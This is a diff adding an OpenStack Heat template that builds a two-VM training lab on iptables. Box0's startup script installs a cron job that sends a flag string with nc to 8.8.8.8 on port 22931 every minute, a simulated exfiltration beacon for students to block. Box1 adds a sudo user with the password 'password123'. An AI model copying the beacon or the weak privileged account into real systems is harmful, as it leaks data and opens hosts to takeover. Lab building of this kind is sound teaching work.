@@ -1,0 +1,193 @@
+heat_template_version: "2016-10-14"
+
+description: Basics iptables Usage
+
+parameters:
+
+  student_id:
+    type: string
+    label: Student ID
+    description: Student ID Number
+    constraints:
+      -  allowed_pattern: "[0-2]?[0-9][0-9]"
+         description: Student ID must be a numeric > 010 and < 250
+    default: "100"
+
+  ex_lane_net_uuid:
+    type: string
+    label: Lane Network UUID
+    description: UUID of the persistent exercise network object
+    default: c7423992-560f-4205-ae99-1a2237f0bd8e
+
+  ex_lane_net_sub_uuid:
+    type: string
+    label: Exercise Network Subnet UUID
+    description: UUID of the persistent exercise network subnet object
+    default: feb0180f-0390-44fd-8fb1-f78eb3110704
+
+resources:
+#unique string is used to randomize all instnce names, also provides entropy for scripts
+#please don't remove this one. if you need more randomization, create another
+  random-str:
+    type: OS::Heat::RandomString
+    properties:
+      length: 8
+
+
+
+#networks
+  ex-lane-net:
+    type: OS::Neutron::Net
+    properties:
+      name: ex_lane_net
+    external_id: { get_param: ex_lane_net_uuid }
+
+  ex-lane-net-sub:
+    type: OS::Neutron::Subnet
+    properties:
+      cidr: 172.18.0.0/16
+      gateway_ip: 172.18.0.1
+      network: { get_resource: ex-lane-net }
+      name: ex_lane_net_sub
+      dns_nameservers: [ 8.8.8.8 ]
+    external_id: { get_param: ex_lane_net_sub_uuid }
+
+  box0-net:
+    type: OS::Neutron::Net
+    properties:
+      name: box0_net
+
+  box0-net-sub:
+    type: OS::Neutron::Subnet
+    properties:
+      cidr: 172.20.1.0/24
+      gateway_ip: 
+        str_replace:
+          template: 172.20.1.stuID
+          params:
+            stuID: { get_param: student_id }
+      network: { get_resource: box0-net }
+      name: box0_net_sub
+      dns_nameservers: [ 8.8.8.8 ]
+
+
+
+#ports for boxes
+
+  box0-net-ports-box0:
+    type: OS::Neutron::Port    
+    properties:
+      port_security_enabled: false
+      network_id: { get_resource: box0-net }
+      fixed_ips:
+      - subnet_id: { get_resource: box0-net-sub }
+        ip_address:
+          str_replace:
+            template: 172.20.1.33
+            params:
+              stuID: { get_param: student_id }
+    depends_on: [box0-net, box0-net-sub ]
+
+  box0-net-ports-box1:
+    type: OS::Neutron::Port    
+    properties:
+      port_security_enabled: false
+      network_id: { get_resource: box0-net }
+      fixed_ips:
+      - subnet_id: { get_resource: box0-net-sub }
+        ip_address:
+          str_replace:
+            template: 172.20.1.stuID
+            params:
+              stuID: { get_param: student_id }
+    depends_on: [box0-net, box0-net-sub ]
+
+  ex-lane-net-ports-box1:
+    type: OS::Neutron::Port    
+    properties:
+      port_security_enabled: false
+      network_id: { get_resource: ex-lane-net }
+      fixed_ips:
+      - subnet_id: { get_resource: ex-lane-net-sub }
+        ip_address:
+          str_replace:
+            template: 172.18.stuID.42
+            params:
+              stuID: { get_param: student_id }
+    depends_on: [ex-lane-net, ex-lane-net-sub ]
+    
+  box0:
+    type: OS::Nova::Server
+    properties:
+      name:
+        str_replace:
+          template: ex_lane_box0_stuID_randomStr
+          params:
+            stuID: { get_param: student_id }
+            randomStr: { get_resource: random-str }
+      image: Debian Jessie
+      flavor: cy.small
+      networks:
+        - port: { get_resource: box0-net-ports-box0 }
+      user_data:
+        str_replace:
+          template: |
+            #!/bin/bash
+            echo "root:$password" | chpasswd
+            echo "nameserver 8.8.8.8" > /etc/resolv.conf
+            sleep 10 && apt-get update && apt-get upgrade -y && apt dist-upgrade -y && apt-get install -y telnet
+            printf "echo 'flag:{You thought your secrets were safe. You were wrong.}' | nc 8.8.8.8 22931" > /script2
+            chmod 700 /script2
+            crontab -l | { cat; echo "* * * * * /script2"; } | crontab - 
+          params:
+            $password: { get_resource: random-str }
+            boxHostname: basics1_box0
+      user_data_format: RAW
+
+
+  box1:
+    type: OS::Nova::Server
+    properties:
+      name:
+        str_replace:
+          template: ex_lane_box1_stuID_randomStr
+          params:
+            stuID: { get_param: student_id }
+            randomStr: { get_resource: random-str }
+      image: Debian Jessie
+      flavor: cy.small
+      networks:
+        - port: { get_resource: ex-lane-net-ports-box1 }
+        - port: { get_resource: box0-net-ports-box1 }
+      user_data:
+        str_replace:
+          template: |
+            #!/bin/bash
+            echo "root:$password" | chpasswd
+            echo "harry:x:1001:1001:harry,,,:/home/harry:/bin/bash" >> /etc/passwd
+            mkdir -p /home/harry
+            chown harry:harry /home/harry
+            echo "harry:password123" | chpasswd
+            echo "root:$password" | chpasswd
+            sed -i 's/localhost.*/localhost boxHostname/g' /etc/hosts
+            echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
+            echo "harry ALL=(ALL:ALL) ALL" >> /etc/sudoers
+            sysctl -p /etc/sysctl.conf
+            echo "nameserver 8.8.8.8" > /etc/resolv.conf
+            iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+            echo boxHostname>/etc/hostname
+            apt-get update && apt-get upgrade -y && apt dist-upgrade -y && apt-get install -y tcpdump
+            apt-get install -y ssh sshd tcpdump
+            sleep 30 && echo "root:$password" | chpasswd 
+            sleep 30 && echo "harry:password123" | chpasswd
+          params:
+            $password: { get_resource: random-str }
+            boxHostname: basics1_box1
+      user_data_format: RAW
+
+outputs:
+ random_str:
+    description: Random string used to seed student VMs, or in this case, set root password
+    value: { get_attr : [random-str, value] }
+
+
